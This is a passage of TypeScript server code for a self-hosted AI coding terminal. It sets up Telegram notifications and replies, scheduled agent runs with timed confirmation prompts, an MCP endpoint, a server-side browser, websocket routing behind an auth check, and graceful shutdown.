     and it breaks the day the machine gets a new one. CODETERM_PUBLIC_URL
     names the address you would actually type. */
  const publicBase = (cfg.publicUrl ?? `http://${HOST}:${port}`).replace(/\/+$/, "");
  /* Two-way: a reply answers the pending card, or prompts, whichever chat the
     notification named. Requires both a configured Telegram target and the
     separate opt-in — sending notifications does not by itself mean replies
     get to drive the agent. */
  const telegramListener = cfg.notify?.telegram && cfg.telegramControl
    ? new TelegramListener({ convo, notifier, token: cfg.notify.telegram.token, chatId: cfg.notify.telegram.chatId, publicBase,
                             contextDir: cfg.telegramContextDir ?? join(WORKSPACE, ".telegram-context"), apiBase: `http://${HOST.includes(":") ? `[${HOST}]` : HOST}:${PORT}`,
                             allowedUsers: (process.env.CODETERM_TELEGRAM_USERS ?? "").split(",").map((u) => u.trim()).filter(Boolean), log, warn })
    : null;
  telegramListener?.start();
  /* A card in a run nobody is watching. The notification is the only thing
     that can reach you, and a link into that chat is the whole answer: a
     client attaching while a card is open is sent it (measured), so opening
     the link puts the confirmation box in front of you with the run still
     blocked on it. */
  const askedYou = (s: Schedule, chatId: string, what: string) => {
    const mins = Math.max(1, Math.round(s.waitMs / 60_000));
    void notifier.send({
      title: `${s.title} — waiting for you`,
      message: `${what}${telegramListener ? "\n\nReply here, or open the chat." : "\n\nOpen the chat to answer."} If nobody does within ${mins} min it is refused and the run carries on without it.`,
      url: `${publicBase}/?chat=${encodeURIComponent(chatId)}`, tags: ["question"],
    }).then((r) => telegramListener?.noteSent(r.telegramMessageId, chatId));
  };
  const scheduler = new Scheduler({
    store: schedules, log, warn,
    runner: makeRunner({ convo, prompts, onAsk: askedYou,
      serverBrowserReady: () => serverBrowser.running && bridge.instances.includes(SERVER_BROWSER_ID) }),
  });
  scheduler.onDone = (s, run) => {
    const removed = pruneRuns({ convo }, s);
    if (removed.length) log(`[schedule] ${s.title}: removed ${removed.length} old run chat(s)`);
    const e: ClientEvent = { kind: "schedule_done", id: s.id, title: s.title, chatId: run.chatId, outcome: run.outcome, summary: run.summary, costUsd: run.costUsd, files: run.files };
    for (const send of broadcast) send(e);
    const extra = [...(run.needed.length ? [`needed: ${run.needed.join(", ")}`] : []), ...(run.cards.length ? [`answered no: ${run.cards.join(", ")}`] : []), ...(run.files.length ? [`files: ${run.files.map((f) => f.split("/").pop()).join(", ")}`] : [])];
    void notifier.send({ title: `${s.title} — ${run.outcome.replace("-", " ")}${run.costUsd != null ? ` · $${run.costUsd.toFixed(2)}` : ""}`, message: [run.summary, ...extra].filter(Boolean).join("\n"),
      ...(run.chatId ? { url: `${publicBase}/?chat=${encodeURIComponent(run.chatId)}` } : {}), tags: [run.outcome === "done" ? "white_check_mark" : run.outcome === "failed" ? "x" : "warning"] })
      .then((r) => { if (run.chatId) telegramListener?.noteSent(r.telegramMessageId, run.chatId); });
  };
  /** Which notification targets are set, and a test message so you know they work before 08:00. */
  app.get("/notify", guard, (_req, res) => { res.json({ targets: notifier.targets }); });
  app.post("/notify/test", guard, async (_req, res) => {
    if (!notifier.targets.length) { res.status(400).json({ error: "no notification targets: set CODETERM_TELEGRAM_TOKEN + CODETERM_TELEGRAM_CHAT and/or CODETERM_NOTIFY_WEBHOOK in .env, then restart" }); return; }
    const r = await notifier.send({ title: "code terminal — test", message: "Notifications reach this device. Scheduled runs will report here.", url: publicBase + "/manage.html", tags: ["bell"] });
    res.status(r.failed.length && !r.sent.length ? 502 : 200).json(r);
  });
  const scheduleView = (s: ReturnType<ScheduleStore["get"]>) => s && ({ ...s, words: describeCron(s.when.cron), running: scheduler.isRunning(s.id), runs: s.runs.slice(0, 20) });
  // codeTerminal as an MCP server for other agents (src/mcp.ts). Same guard as
  // everything else; it can prompt and read chats but never answer their cards.
  app.all("/mcp", guard, express.json({ limit: "1mb" }), mcpHandler({
    convo, publicBase, version: pkgVersion,
    schedules: () => schedules.list().map(scheduleView),
    ...(SHELL ? { tmux: { list: async () => (await haveTmux()) ? listSessions() : [], capture: (name: string, lines: number) => capture(name, lines) } } : {}),
  }));
  app.get("/schedules", guard, (_req, res) => { res.json({ schedules: schedules.list().map(scheduleView), prompts: prompts.all().map((p) => ({ id: p.id, title: p.title })), projects: convo.projects().map((p) => ({ id: p.id, name: p.name })) }); });
  app.get("/schedules/preview", guard, (req, res) => {
    try {
      const tz = String(req.query.tz ?? "UTC"); if (!validTimeZone(tz)) throw new Error(`unknown time zone "${tz}"`);
      const { cron, words } = parseWhen(String(req.query.when ?? ""));
      const next: string[] = []; let from = new Date();
      for (let i = 0; i < 3; i++) { const n = nextRun(cron, tz, from); if (!n) break; next.push(n.toISOString()); from = n; }
      res.json({ cron, words, tz, next });
    } catch (e) { res.status(400).json({ error: e instanceof Error ? e.message : String(e) }); }
  });
  app.post("/schedules", guard, express.json({ limit: "64kb" }), (req, res) => {
    try { const s = schedules.add(req.body); scheduler.replan(s.id); res.json(scheduleView(schedules.get(s.id))); }
    catch (e) { res.status(400).json({ error: e instanceof Error ? e.message : String(e) }); }
  });
  app.put("/schedules/:id", guard, express.json({ limit: "64kb" }), (req, res) => {
    try { const s = schedules.update(String(req.params.id), req.body); if (!s) { res.status(404).json({ error: "no such schedule" }); return; } scheduler.replan(s.id); res.json(scheduleView(schedules.get(s.id))); }
    catch (e) { res.status(400).json({ error: e instanceof Error ? e.message : String(e) }); }
  });
  app.delete("/schedules/:id", guard, (req, res) => { res.json({ ok: schedules.remove(String(req.params.id)) }); });
  app.post("/schedules/:id/run", guard, (req, res) => {
    try { const run = scheduler.runNow(String(req.params.id)); res.status(202).json({ run }); }
    catch (e) { res.status(400).json({ error: e instanceof Error ? e.message : String(e) }); }
  });
  bridge.onChange = () => { for (const f of browserWatchers) f(); };

  /* The server browser: status, start, stop, navigate. The live view is the /browser/live socket below. */
  app.get("/browser/server", guard, async (_req, res) => { res.json(await serverBrowser.status()); });
  app.post("/browser/server/start", guard, async (_req, res) => {
    try { await serverBrowser.start(); res.json(await serverBrowser.status()); }
    catch (e) { res.status(500).json({ error: e instanceof Error ? e.message : String(e) }); }
  });
  app.post("/browser/server/stop", guard, async (_req, res) => { await serverBrowser.stop(); res.json(await serverBrowser.status()); });
  app.post("/browser/server/navigate", guard, express.json({ limit: "8kb" }), async (req, res) => {
    try { await serverBrowser.navigate(String((req.body as { url?: string }).url ?? "about:blank")); res.json({ ok: true }); }
    catch (e) { res.status(400).json({ error: e instanceof Error ? e.message : String(e) }); }
  });

  server.on("upgrade", (req: IncomingMessage, socket, head) => {
    // A throw in here is an unhandled rejection, and that ends the process. It
    // ran before the auth check: one request with `Host: [` from any tailnet
    // peer took every chat and shell down. Refuse the request instead.
    upgrade(req, socket, head).catch((e: unknown) => {
      logDeny("upgrade", `bad request: ${e instanceof Error ? e.message : String(e)}`);
      if (!socket.destroyed) { socket.write("HTTP/1.1 400 Bad Request\r\n\r\n"); socket.destroy(); }
    });
  });

  const upgrade = async (req: IncomingMessage, socket: Duplex, head: Buffer): Promise<void> => {
    // A constant base: the Host header is the client's to spoil.
    const route = new URL(req.url ?? "/", "http://x").pathname;
    if (route === "/pty" && !SHELL) {
      logDeny(route, "the shell pane is off (CODETERM_SHELL=0)");
      socket.write("HTTP/1.1 404 Not Found\r\n\r\n");
      socket.destroy();
      return;
    }
    if (route !== "/ws" && route !== "/pty" && route !== "/ext" && route !== "/browser/live") {
      socket.write("HTTP/1.1 404 Not Found\r\n\r\n");
      socket.destroy();
      return;
    }

    const deny = await auth.denyReason(req);
    if (deny) {
      logDeny(route, deny);
      socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
      socket.destroy();
      return;
    }

    wss.handleUpgrade(req, socket, head, (ws) => {
      // The extension speaks {type}, the panel and pty speak {kind}.
      heartbeat(ws, cfg.heartbeatMs ?? 30_000, route === "/ext" ? '{"type":"ping"}' : '{"kind":"ping"}');
      if (route === "/ws") {
        const q = new URL(req.url ?? "/", "http://x").searchParams;
        attachAgent(ws, ctx, q.get("observe") !== "1", q.get("chat"));
      }
      else if (route === "/ext") bridge.attach(ws);
      else if (route === "/browser/live") serverBrowser.attachViewer(ws);
      else attachShell(ws, ctx);
    });
  };

  /**
   * At boot this can start before tailscaled has assigned the address, and
   * binding a not-yet-existent IP fails with EADDRNOTAVAIL. Retry rather than
   * die, so the unit does not need to guess at ordering — this also covers
   * tailscale restarting or the address changing under us.
   */
  port = await new Promise<number>((resolveListen, rejectListen) => {
    function listenWithRetry(attempt = 0): void {
      const onError = (err: NodeJS.ErrnoException) => {
        const retryable = err.code === "EADDRNOTAVAIL" || err.code === "EADDRINUSE";
        if (!retryable) { rejectListen(err); return; }
        const wait = Math.min(30_000, 1000 * 2 ** Math.min(attempt, 5));
        warn(`bind ${HOST}:${PORT} failed (${err.code}); retrying in ${wait / 1000}s`);
        server.removeListener("error", onError);
        setTimeout(() => listenWithRetry(attempt + 1), wait);
      };
      server.once("error", onError);
      server.listen(PORT, HOST, () => {
        server.removeListener("error", onError);
        resolveListen((server.address() as { port: number }).port);
      });
    }
    listenWithRetry();
  });

  log(`code-terminal  http://${HOST}:${port}`);
  if (sbCfg.autostart) serverBrowser.start().catch((e) => warn(`[server-browser] autostart: ${e instanceof Error ? e.message : e}`));
  scheduler.start(cfg.scheduleTickMs ?? 30_000);
  for (const line of auth.banner()) log(line);
  log(`workspace      ${WORKSPACE}`);
  log(SHELL ? `shell          /pty — real PTY, NO approval gate` : `shell          off (CODETERM_SHELL=0) — no /pty, no terminal tool`);
  log(`browser        /ext — extension bridge, tools ungated`);
  log(`files          ${FILES_ROOT} (browse, upload, download)`);
  log(`projects       ${cfg.projectsRoot}`);
  if (telegramListener) log(`telegram       two-way — a reply answers a card or prompts the chat it named`);

  // A restart is a good moment to drop what the previous run left behind.
  void pruneScreenshots().then((n) => { if (n) log(`[shots] pruned ${n} old screenshots`); }).catch(() => {});

  // systemd stops the unit with SIGTERM. Without this the process died mid
  // debounce: up to 400ms of transcript and 1s of usage counts were lost on
  // every restart, and the SDK children were killed by the cgroup rather than
  // closed.
  let stopping: Promise<void> | null = null;
  const shutdown = (signal = "shutdown"): Promise<void> => {
    if (stopping) return stopping;
    stopping = new Promise<void>((done) => {
      log(`[${signal}] shutting down`);
      clearInterval(sweeper);
      scheduler.stop();
      void telegramListener?.stop().catch((e) => warn(`shutdown: telegram listener ${String(e)}`));
      try { convo.shutdown(); } catch (e) { warn(`shutdown: chats ${String(e)}`); }
      void serverBrowser.stop().catch((e) => warn(`shutdown: server browser ${String(e)}`));
      try { usage.save(); } catch (e) { warn(`shutdown: usage ${String(e)}`); }
      for (const ws of wss.clients) ws.close(1001, "server restarting");
      server.close(() => done());
      // Keep-alive connections would hold close() open; the sockets are told.
      server.closeAllConnections?.();
    });
    return stopping;
  };

  return { server, port, convo, bridge, watches, usage, auth, shutdown };
}

/* ---------------- the process ---------------- */

const isMain = process.argv[1] !== undefined && resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isMain) {
  let running: Running;
  try {
    running = await boot(envConfig());
  } catch (e) {
    if (e instanceof AuthRefused) { console.error(e.message); process.exit(1); }
    throw e;
  }
  const stop = (signal: string) => {
    void running.shutdown(signal);
    // The SDK subprocesses take a moment to exit after their input ends; give
    // them that, then leave regardless.
    setTimeout(() => process.exit(0), 1500).unref();
  };
  process.on("SIGTERM", () => stop("SIGTERM"));
  process.on("SIGINT", () => stop("SIGINT"));
  // One stray rejection used to end the process, and with it every chat, run
  // and shell. Log it loudly and keep serving; the code that threw is the bug.
  process.on("unhandledRejection", (reason) => {
    console.error("[unhandled rejection]", reason instanceof Error ? reason.stack ?? reason.message : reason);
  });
}
